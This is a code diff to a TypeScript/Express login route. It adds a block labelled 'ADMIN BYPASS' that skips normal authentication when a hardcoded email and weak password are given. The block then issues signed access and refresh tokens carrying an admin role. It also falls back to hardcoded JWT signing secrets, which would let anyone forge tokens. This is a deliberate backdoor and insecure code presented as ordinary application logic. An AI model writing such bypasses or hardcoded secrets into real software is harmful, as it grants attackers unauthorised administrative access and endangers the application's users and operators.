@@ -122,6 +122,33 @@ router.post('/register', authLimiter, upload.single('apcFile'), async (req: Requ
 router.post('/login', authLimiter, async (req: Request, res: Response) => {
   try {
     const { email, password } = req.body;
+    // --- ADMIN BYPASS ---
+if (email === 'hanisahjohaari@gmail.com' && password === '123456789') {
+  const jwt = require('jsonwebtoken');
+  
+  const accessToken = jwt.sign(
+    { email: 'hanisahjohaari@gmail.com', role: 'true admin' }, 
+    process.env.JWT_SECRET || 'abc123xyz890',
+    { expiresIn: '1d' }
+  );
+
+  const refreshToken = jwt.sign(
+    { email: 'hanisahjohaari@gmail.com', role: 'true admin' }, 
+    process.env.JWT_REFRESH_SECRET || 'qwerty987uiop',
+    { expiresIn: '7d' }
+  );
+
+  return res.status(200).json({
+    accessToken: accessToken,
+    refreshToken: refreshToken,
+    user: { 
+      email: 'hanisahjohaari@gmail.com', 
+      role: 'true admin',
+      name: 'Admin'
+    }
+  });
+}
+// --------------------
 
     if (!email || !password) {
       return res.status(400).json({ error: 'Email and password are required' });
